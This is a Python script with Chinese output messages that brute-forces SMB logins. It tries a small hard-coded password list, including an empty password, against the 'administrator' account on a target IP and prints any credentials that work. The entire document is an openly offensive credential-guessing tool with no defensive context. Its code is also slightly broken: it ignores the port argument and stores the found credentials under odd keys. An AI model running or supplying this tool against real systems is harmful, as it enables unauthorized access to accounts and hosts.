import argparse
import fs.smbfs
username="administrator"
dict=['123456','','12388','administator']
is_true="成功"
last_pd={"username":None,"password":None,"ip":None,"is_ok":False}
parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip", default='127.0.0.1', help="Target a single URL")
parser.add_argument("-p", "--port", default='139', help="Target a single port")
args = parser.parse_args()
for password in dict:
    try:
        smb = fs.smbfs.SMBFS(host=args.ip, username=username, passwd=password,port=139)
        is_true="成功"
    except:
        is_true="失败"
    if password == "":
        password = "空"
    print("smb爆破中 账号---" + username + "--- 密码 ---" + password + "--- 爆破" + is_true)
    if(is_true=="成功"):
        last_pd["is_ok"]=True
        last_pd["ip"]=args.ip
        last_pd[username]=username
        last_pd[password]=password
        break
if(last_pd["is_ok"]):
    print("最终爆破成功 \nip:\t"+last_pd["ip"]+"\n账号密码为:\n"+last_pd[username]+"\t"+last_pd[password])



